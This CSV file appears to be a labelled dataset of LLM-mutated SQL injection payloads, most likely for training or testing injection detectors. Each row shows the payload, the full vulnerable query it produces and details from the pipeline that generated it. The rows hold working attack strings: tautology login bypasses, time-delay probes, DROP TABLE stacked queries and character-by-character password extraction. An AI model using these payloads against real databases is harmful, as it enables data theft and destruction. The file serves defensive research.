attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage,is_valid_syntax,winning_context_index,winning_dialect,tables,columns,literal_types,select_arm_widths,node_set,Query
encoding_obfuscation,user_lookup,%22 OR (ASCII('A')+ASCII('I')) = (ASCII('B')+ASCII('C')+ASCII('O')+ASCII('e')) AND ('%' = '%),SELECT * FROM users WHERE id = %22 OR (ASCII('A')+ASCII('I')) = (ASCII('B')+ASCII('C')+ASCII('O')+ASCII('e')) AND ('%' = '%),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%22%20or%20(CHAR(65)%2BCHAR(73))%20=%20(CHAR(66)%2BCHAR(67)%2BCHAR(79)%2BCHAR(101))%20and%20('%25'%20=%20',judge,False,-1,,[],[],[],[],[],%22 OR (ASCII('A')+ASCII('I')) = (ASCII('B')+ASCII('C')+ASCII('O')+ASCII('e')) AND ('%' = '%)
encoding_obfuscation,user_lookup,"'""')#","SELECT * FROM users WHERE id = '""')#",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'%22)%23,sandbox,True,7,mysql,"[""users""]",[],[],[],"[""Alias"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]","'""')#"
encoding_obfuscation,user_lookup,%27 OR (SELECT ASCII('Q')+ASCII('A')+ASCII('R')+ASCII('I')+ASCII('D')+ASCII('J') FROM pg_stat_activity) LIKE '%' --,SELECT * FROM users WHERE id = %27 OR (SELECT ASCII('Q')+ASCII('A')+ASCII('R')+ASCII('I')+ASCII('D')+ASCII('J') FROM pg_stat_activity) LIKE '%' --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%27%20OR%20(SELECT%20CHAR%2881%29%2BCHAR%2865%29%2BCHAR%2882%29%2BCHAR%2873%29%2BCHAR%2868%29%2BCHAR%2871%29%20FROM%20pg_stat_activity)%20LIKE%20'%,judge,True,1,default,"[""users"", ""pg_stat_activity""]",[],[],[],"[""Add"", ""Ascii"", ""EQ"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Mod"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",%27 OR (SELECT ASCII('Q')+ASCII('A')+ASCII('R')+ASCII('I')+ASCII('D')+ASCII('J') FROM pg_stat_activity) LIKE '%' --
encoding_obfuscation,user_lookup,"#/**/"" OR SLEEP(5) AND ('%' = '%')#","SELECT * FROM users WHERE id = #/**/"" OR SLEEP(5) AND ('%' = '%')#",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23/**/%22%20OR%20(SLEEP(5)%20AND%20('%25'%20=%20'%25'))%23,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Select"", ""Star"", ""Table"", ""Where""]","#/**/"" OR SLEEP(5) AND ('%' = '%')#"
encoding_obfuscation,order_filter,;WAITFOR DELAY '0:0:10' --,SELECT * FROM orders WHERE status = ';WAITFOR DELAY '0:0:10' --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%21%2f WAITFOR DELAY '0:0:10' --,judge,False,-1,,[],[],[],[],[],;WAITFOR DELAY '0:0:10' --
encoding_obfuscation,order_filter,/* */' OR LOWER('b') = LOWER('b') --,SELECT * FROM orders WHERE status = '/* */' OR LOWER('b') = LOWER('b') --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/* */' OR LOWER('a') = LOWER('a,judge,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Lower"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",/* */' OR LOWER('b') = LOWER('b') --
encoding_obfuscation,order_filter,%23%23%23--%20DROP%20TABLE%20users,SELECT * FROM orders WHERE status = '%23%23%23--%20DROP%20TABLE%20users' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,CHAR(35)%20AND%20LOWER('a')=%20LOWER('a')--,judge,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Select"", ""Star"", ""Table"", ""Where""]",%23%23%23--%20DROP%20TABLE%20users
encoding_obfuscation,comment_insert,; DROP TABLE users; CREATE TABLE hacked_table;,"INSERT INTO comments (user_id, body) VALUES (1, '; DROP TABLE users; CREATE TABLE hacked_table;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"%23%23%23--%20SELECT%20dbms_pipe.receive_message(chr(66)%20||chr(67)%20||chr(79)%20||chr(101),5)%20FROM%20dual%20AND%20('%20='%20'",sandbox,True,0,default,"[""users"", ""hacked_table""]",[],[],[],"[""Create"", ""Drop"", ""Identifier"", ""Table""]",; DROP TABLE users; CREATE TABLE hacked_table;
encoding_obfuscation,comment_insert,CAST(%23%23%23--%20'x' AS VARCHAR),"INSERT INTO comments (user_id, body) VALUES (1, 'CAST(%23%23%23--%20'x' AS VARCHAR)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1)%2522)%2522)%2520WAITFOR%20DELAY%20'0:0:5'%2520AND%2520('%2520='%2520',judge,False,-1,,[],[],[],[],[],CAST(%23%23%23--%20'x' AS VARCHAR)
encoding_obfuscation,comment_insert,(CASE WHEN (SELECT COUNT(*) from users WHERE username LIKE 'admin') > 0 THEN 'hack' ELSE 'safe' END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT COUNT(*) from users WHERE username LIKE 'admin') > 0 THEN 'hack' ELSE 'safe' END) --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') --,sandbox,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Case"", ""Column"", ""Count"", ""From"", ""GT"", ""Identifier"", ""If"", ""Like"", ""Literal"", ""Paren"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",(CASE WHEN (SELECT COUNT(*) from users WHERE username LIKE 'admin') > 0 THEN 'hack' ELSE 'safe' END) --
encoding_obfuscation,comment_insert,/*/#**//**///waitfor delay '00:00:05 '//*/ --'='--,"INSERT INTO comments (user_id, body) VALUES (1, '/*/#**//**///waitfor delay '00:00:05 '//*/ --'='--')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23%23%23%23%23/*/**/ WAITFOR DELAY '0:0:5' /*/%20AND%20('%20=%20',judge,True,0,snowflake,[],[],[],[],[],/*/#**//**///waitfor delay '00:00:05 '//*/ --'='--
encoding_obfuscation,comment_insert,"(select 1 from (select convert(int,(ascii(mid((select top 1 password from users order by id desc),1,1))))-65) > 0 --","INSERT INTO comments (user_id, body) VALUES (1, '(select 1 from (select convert(int,(ascii(mid((select top 1 password from users order by id desc),1,1))))-65) > 0 --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1) OR DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5) --",judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]","(select 1 from (select convert(int,(ascii(mid((select top 1 password from users order by id desc),1,1))))-65) > 0 --"
encoding_obfuscation,comment_insert,OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --,"INSERT INTO comments (user_id, body) VALUES (1, 'OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1 OR (CASE WHEN USER LIKE '%admin'%' THEN 1 ELSE 0 END) --,judge,True,1,default,"[""users""]","[""USER""]","[""INTEGER""]",[],"[""Case"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Is"", ""Like"", ""Literal"", ""Not"", ""Null"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]",OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --
nested_injection,login,' OR EXISTS(SELECT * FROM users WHERE username LIKE ''%)' --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM users WHERE username LIKE ''%)' --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR (SELECT * FROM users WHERE username = '') IS NULL/*,judge,True,0,default,[],[],[],[],"[""Literal""]",' OR EXISTS(SELECT * FROM users WHERE username LIKE ''%)' --
nested_injection,search,--; waitfor delay '00:00:10' --,SELECT * FROM products WHERE name LIKE '%--; waitfor delay '00:00:10' --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,||;WAITFOR DELAY '0:0:10';--,judge,True,0,default,[],[],[],[],[],--; waitfor delay '00:00:10' --
nested_injection,comment_insert,;-- DROP TABLE comments;,"INSERT INTO comments (user_id, body) VALUES (1, ';-- DROP TABLE comments;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/*' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username IS NULL) --,judge,True,0,default,[],[],[],[],"[""Semicolon""]",;-- DROP TABLE comments;
nested_injection,comment_insert,"' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE user_id=1)=CHAR(97)","INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE user_id=1)=CHAR(97)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*' OR ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1), 1, 1))=97--",judge,True,2,default,"[""users""]","[""name"", ""password"", ""user_id""]","[""TEXT"", ""INTEGER"", ""INTEGER""]",[],"[""Chr"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Substring"", ""Table"", ""Where""]","' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE user_id=1)=CHAR(97)"
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'),"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM (SELECT * FROM comments ORDER BY comment_id DESC LIMIT 1))--,judge,True,2,default,"[""users""]","[""name"", ""username""]","[""TEXT"", ""INTEGER""]",[],"[""Column"", ""EQ"", ""Exists"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')
